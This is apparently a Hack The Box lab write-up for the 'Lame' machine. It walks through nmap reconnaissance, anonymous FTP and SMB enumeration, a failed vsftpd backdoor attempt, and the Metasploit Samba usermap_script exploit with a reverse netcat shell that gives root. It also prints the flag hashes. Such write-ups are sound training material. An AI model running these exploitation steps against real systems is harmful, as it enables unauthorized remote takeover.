---
title: "HTB: Lame [Easy]"
date: 2025-10-06 00:00 +0800
categories: [HTB]
tags: [HTB, Easy, Samba, SMB, Linux, Metasploit]
image: https://github.com/user-attachments/assets/2ac0cc1d-f204-4e6e-8dd4-da6046714910
---

<img width="871" height="337" alt="image" src="https://github.com/user-attachments/assets/2ac0cc1d-f204-4e6e-8dd4-da6046714910" />

## Recon

nmap scan result:
```

┌──(kryzi㉿kryzi)-[~/Desktop/HTB/Lame]
└─$ nmap -sCV -p- -T4 -vvv -oA nmap/ 10.10.10.3
Starting Nmap 7.98 ( https://nmap.org ) at 2026-01-05 21:59 +0800
NSE: Loaded 158 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 21:59
Completed NSE at 21:59, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 21:59
Completed NSE at 21:59, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 21:59
Completed NSE at 21:59, 0.00s elapsed
Initiating Ping Scan at 21:59
Scanning 10.10.10.3 [4 ports]
Completed Ping Scan at 21:59, 0.04s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 21:59
Completed Parallel DNS resolution of 1 host. at 21:59, 0.50s elapsed
DNS resolution of 1 IPs took 0.50s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating SYN Stealth Scan at 21:59
Scanning 10.10.10.3 [65535 ports]
Discovered open port 139/tcp on 10.10.10.3
Discovered open port 22/tcp on 10.10.10.3
Discovered open port 21/tcp on 10.10.10.3
Discovered open port 445/tcp on 10.10.10.3
Stats: 0:00:20 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 13.17% done; ETC: 22:01 (0:02:12 remaining)
SYN Stealth Scan Timing: About 44.79% done; ETC: 22:00 (0:01:02 remaining)
Discovered open port 3632/tcp on 10.10.10.3
Completed SYN Stealth Scan at 22:00, 87.87s elapsed (65535 total ports)
Initiating Service scan at 22:00
Scanning 5 services on 10.10.10.3
Completed Service scan at 22:00, 11.26s elapsed (5 services on 1 host)
NSE: Script scanning 10.10.10.3.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 22:00
NSE: [ftp-bounce 10.10.10.3:21] PORT response: 500 Illegal PORT command.
NSE Timing: About 99.86% done; ETC: 22:01 (0:00:00 remaining)
Completed NSE at 22:01, 40.10s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 22:01
Completed NSE at 22:01, 0.85s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 22:01
Completed NSE at 22:01, 0.00s elapsed
Nmap scan report for 10.10.10.3
Host is up, received echo-reply ttl 63 (0.014s latency).
Scanned at 2026-01-05 21:59:07 +08 for 140s
Not shown: 65530 filtered tcp ports (no-response)
PORT     STATE SERVICE     REASON         VERSION
21/tcp   open  ftp         syn-ack ttl 63 vsftpd 2.3.4
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to 10.10.16.6
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      vsFTPd 2.3.4 - secure, fast, stable
|_End of status
22/tcp   open  ssh         syn-ack ttl 63 OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
| ssh-hostkey:
|   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)
| ssh-dss AAAAB3NzaC1kc3MAAACBALz4hsc8a2Srq4nlW960qV8xwBG0JC+jI7fWxm5METIJH4tKr/xUTwsTYEYnaZLzcOiy21D3ZvOwYb6AA3765zdgCd2Tgand7F0YD5UtXG7b7fbz99chReivL0SIWEG/E96Ai+pqYMP2WD5KaOJwSIXSUajnU5oWmY5x85sBw+XDAAAAFQDFkMpmdFQTF+oRqaoSNVU7Z+hjSwAAAIBCQxNKzi1TyP+QJIFa3M0oLqCVWI0We/ARtXrzpBOJ/dt0hTJXCeYisKqcdwdtyIn8OUCOyrIjqNuA2QW217oQ6wXpbFh+5AQm8Hl3b6C6o8lX3Ptw+Y4dp0lzfWHwZ/jzHwtuaDQaok7u1f971lEazeJLqfiWrAzoklqSWyDQJAAAAIA1lAD3xWYkeIeHv/R3P9i+XaoI7imFkMuYXCDTq843YU6Td+0mWpllCqAWUV/CQamGgQLtYy5S0ueoks01MoKdOMMhKVwqdr08nvCBdNKjIEd3gH6oBk/YRnjzxlEAYBsvCmM4a0jmhz0oNiRWlc/F+bkUeFKrBx/D2fdfZmhrGg==
|   2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)
|_ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAQEAstqnuFMBOZvO3WTEjP4TUdjgWkIVNdTq6kboEDjteOfc65TlI7sRvQBwqAhQjeeyyIk8T55gMDkOD0akSlSXvLDcmcdYfxeIF0ZSuT+nkRhij7XSSA/Oc5QSk3sJ/SInfb78e3anbRHpmkJcVgETJ5WhKObUNf1AKZW++4Xlc63M4KI5cjvMMIPEVOyR3AKmI78Fo3HJjYucg87JjLeC66I7+dlEYX6zT8i1XYwa/L1vZ3qSJISGVu8kRPikMv/cNSvki4j+qDYyZ2E5497W87+Ed46/8P42LNGoOV8OcX/ro6pAcbEPUdUEfkJrqi2YXbhvwIJ0gFMb6wfe5cnQew==
139/tcp  open  netbios-ssn syn-ack ttl 63 Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn syn-ack ttl 63 Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
3632/tcp open  distccd     syn-ack ttl 63 distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_smb2-time: Protocol negotiation failed (SMB2)
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_smb2-security-mode: Couldn't establish a SMBv2 connection.
| smb-os-discovery:
|   OS: Unix (Samba 3.0.20-Debian)
|   Computer name: lame
|   NetBIOS computer name:
|   Domain name: hackthebox.gr
|   FQDN: lame.hackthebox.gr
|_  System time: 2026-01-05T08:30:53-05:00
|_clock-skew: mean: 2h00m03s, deviation: 3h32m12s, median: -29m59s
| p2p-conficker:
|   Checking for Conficker.C or higher...
|   Check 1 (port 59488/tcp): CLEAN (Timeout)
|   Check 2 (port 36350/tcp): CLEAN (Timeout)
|   Check 3 (port 40169/udp): CLEAN (Timeout)
|   Check 4 (port 59622/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 22:01
Completed NSE at 22:01, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 22:01
Completed NSE at 22:01, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 22:01
Completed NSE at 22:01, 0.00s elapsed
Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 141.14 seconds
           Raw packets sent: 131135 (5.770MB) | Rcvd: 134 (7.847KB)
```

From these scan result, we figure that there's multiple open port with services running: 

- Port 21 (FTP) – running vsftpd 2.3.4

> Anonymous login is allowed, which means anyone can log in without a password. This is insecure and may allow access to files on the system.

- Port 22 (SSH) – running OpenSSH 4.7p1

> SSH allows remote login to the system. While SSH is normally secure, old versions may contain security issues. If valid credentials are found, SSH can be used to access the machine.

- Port 139 (SMB) – Samba service
- Port 445 (SMB) – Samba service

> **Ports 139** and **445** are used by SMB, a file sharing service. SMB allows systems to share files and folders over a network. **Port 139** uses an older method called NetBIOS. **Port 445** uses direct TCP and is the newer method. The system is running Samba `3.0.20`, which is outdated and vulnerable. Old SMB services are often exploited to gain unauthorized access.

Of course, before anything we would try access **FTP** with anonymous as nmap scan result gave. However, we dont find any file that can be access.
```
┌──(kryzi㉿kryzi)-[~/Desktop/HTB/Lame]
└─$ ftp 10.10.10.3
Connected to 10.10.10.3.
220 (vsFTPd 2.3.4)
Name (10.10.10.3:kryzi): anonymous 
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -lah
229 Entering Extended Passive Mode (|||54133|).
150 Here comes the directory listing.
drwxr-xr-x    2 0        65534        4096 Mar 17  2010 .
drwxr-xr-x    2 0        65534        4096 Mar 17  2010 ..
226 Directory send OK.
```

## Exploitation

Although there is no direct exploit for `OpenSSH 4.7p1`, the SFTP command execution exploit can be attempted since the service is outdated and the target also exposes FTP on **port 21**, making file transfer–based attacks worth testing.

<img width="1260" height="464" alt="image" src="https://github.com/user-attachments/assets/8f1cb972-aab5-4e27-8642-49c161faf096" />

Used **metasploit** for that. Result proven that, it's not exploitable because no session was created:

```
┌──(kryzi㉿kryzi)-[~/Desktop/HTB/Lame]
└─$ searchsploit OpenSSH 4.7p1
-------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                            |  Path
-------------------------------------------------------------------------------------------------------------------------- ---------------------------------
OpenSSH 2.3 < 7.7 - Username Enumeration                                                                                  | linux/remote/45233.py
OpenSSH 2.3 < 7.7 - Username Enumeration (PoC)                                                                            | linux/remote/45210.py
OpenSSH < 6.6 SFTP (x64) - Command Execution                                                                              | linux_x86-64/remote/45000.c
OpenSSH < 6.6 SFTP - Command Execution                                                                                    | linux/remote/45001.py
OpenSSH < 7.4 - 'UsePrivilegeSeparation Disabled' Forwarded Unix Domain Sockets Privilege Escalation                      | linux/local/40962.txt
OpenSSH < 7.4 - agent Protocol Arbitrary Library Loading                                                                  | linux/remote/40963.txt
OpenSSH < 7.7 - User Enumeration (2)                                                                                      | linux/remote/45939.py
-------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results

┌──(kryzi㉿kryzi)-[~/Desktop/HTB/Lame]
└─$ msfconsole -q
msf > search vsFTPd 2.3.4

Matching Modules
================

   #  Name                                  Disclosure Date  Rank       Check  Description
   -  ----                                  ---------------  ----       -----  -----------
   0  exploit/unix/ftp/vsftpd_234_backdoor  2011-07-03       excellent  No     VSFTPD v2.3.4 Backdoor Command Execution


Interact with a module by name or index. For example info 0, use 0 or use exploit/unix/ftp/vsftpd_234_backdoor

msf > use 0
[*] No payload configured, defaulting to cmd/unix/interact
msf exploit(unix/ftp/vsftpd_234_backdoor) > options

Module options (exploit/unix/ftp/vsftpd_234_backdoor):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   CHOST                     no        The local client address
   CPORT                     no        The local client port
   Proxies                   no        A proxy chain of format type:host:port[,type:host:port][...]. Supported proxies: socks5h, sapni, http, socks4, sock
                                       s5
   RHOSTS                    yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT    21               yes       The target port (TCP)


Exploit target:

   Id  Name
   --  ----
   0   Automatic



View the full module info with the info, or info -d command.

msf exploit(unix/ftp/vsftpd_234_backdoor) > set rhosts 10.10.10.3
rhosts => 10.10.10.3
msf exploit(unix/ftp/vsftpd_234_backdoor) > exploit -j
[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.
```

There's a metasploit module for command execution this smb version. We can try this aswell. However let us try to access by using **smbclient** to see what we can find.
```
┌──(kryzi㉿kryzi)-[~/Desktop/HTB/Lame]
└─$ searchsploit Samba 3.0.20
-------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                            |  Path
-------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Samba 3.0.10 < 3.3.5 - Format String / Security Bypass                                                                    | multiple/remote/10095.txt
Samba 3.0.20 < 3.0.25rc3 - 'Username' map script' Command Execution (Metasploit)                                          | unix/remote/16320.rb
Samba < 3.0.20 - Remote Heap Overflow                                                                                     | linux/remote/7701.txt
Samba < 3.6.2 (x86) - Denial of Service (PoC)                                                                             | linux_x86/dos/36741.py
-------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```
Nothing much, only **/tmp** is accesible but nothing much as well. 
```
┌──(kryzi㉿kryzi)-[~/Desktop/HTB/Lame]
└─$ smbclient -L //10.10.10.3
Password for [WORKGROUP\kryzi]:
Anonymous login successful

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        tmp             Disk      oh noes!
        opt             Disk      
        IPC$            IPC       IPC Service (lame server (Samba 3.0.20-Debian))
        ADMIN$          IPC       IPC Service (lame server (Samba 3.0.20-Debian))
Reconnecting with SMB1 for workgroup listing.
Anonymous login successful

        Server               Comment
        ---------            -------

        Workgroup            Master
        ---------            -------
        WORKGROUP            LAME

┌──(kryzi㉿kryzi)-[~/Desktop/HTB/Lame]
└─$ smbclient //10.10.10.3/tmp
Password for [WORKGROUP\kryzi]:
Anonymous login successful
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Mon Jan  5 23:16:05 2026
  ..                                 DR        0  Sat Oct 31 15:33:58 2020
  orbit-makis                        DR        0  Mon Jan  5 19:25:31 2026
  .ICE-unix                          DH        0  Mon Jan  5 14:54:02 2026
  5571.jsvc_up                        R        0  Mon Jan  5 14:55:02 2026
  vmware-root                        DR        0  Mon Jan  5 14:54:16 2026
  .X11-unix                          DH        0  Mon Jan  5 14:54:28 2026
  gconfd-makis                       DR        0  Mon Jan  5 19:25:31 2026
  .X0-lock                           HR       11  Mon Jan  5 14:54:28 2026
  vgauthsvclog.txt.0                  R     1600  Mon Jan  5 14:54:00 2026

                7282168 blocks of size 1024. 5385956 blocks available
smb: \> exit
```
## Shell as root
We shall proceed with the metasploit module: 
```
┌──(kryzi㉿kryzi)-[~/Desktop/HTB/Lame]
└─$ msfconsole -q
msf > search samba 3.0.20

Matching Modules
================

   #  Name                                Disclosure Date  Rank       Check  Description
   -  ----                                ---------------  ----       -----  -----------
   0  exploit/multi/samba/usermap_script  2007-05-14       excellent  No     Samba "username map script" Command Execution


Interact with a module by name or index. For example info 0, use 0 or use exploit/multi/samba/usermap_script

msf > use 0
[*] No payload configured, defaulting to cmd/unix/reverse_netcat
msf exploit(multi/samba/usermap_script) > options

Module options (exploit/multi/samba/usermap_script):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   CHOST                     no        The local client address
   CPORT                     no        The local client port
   Proxies                   no        A proxy chain of format type:host:po
                                       rt[,type:host:port][...]. Supported
                                       proxies: socks5h, sapni, http, socks
                                       4, socks5
   RHOSTS                    yes       The target host(s), see https://docs
                                       .metasploit.com/docs/using-metasploi
                                       t/basics/using-metasploit.html
   RPORT    139              yes       The target port (TCP)


Payload options (cmd/unix/reverse_netcat):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.134.128  yes       The listen address (an interface may b
                                     e specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic



View the full module info with the info, or info -d command.

msf exploit(multi/samba/usermap_script) > set rhosts 10.10.10.3
rhosts => 10.10.10.3
msf exploit(multi/samba/usermap_script) > set lhost tun0
lhost => 10.10.16.6
msf exploit(multi/samba/usermap_script) > exploit -j
[*] Exploit running as background job 1.
[*] Exploit completed, but no session was created.
msf exploit(multi/samba/usermap_script) >
[*] Started reverse TCP handler on 10.10.16.6:4444
[*] Command shell session 1 opened (10.10.16.6:4444 -> 10.10.10.3:60126) at 2026-01-05 23:51:22 +0800
msf exploit(multi/samba/usermap_script) > sessions -i 1
[*] Starting interaction with 1...

whoami
root
pwd
/
ls /home
ftp
makis
service
user
cat /makis/user.txt
6958819105a08ccc702fba470bbb876b
cat /root/root.txt
ec62b3eeb32ba623e5dbac1ab4c40d20
```

The target was running a vulnerable Samba 3.0.20 service, which allowed remote command execution through the usermap_script flaw. Exploiting it gave us a root shell and full control of the machine.

**[Badge](https://labs.hackthebox.com/achievement/machine/1737187/1)**
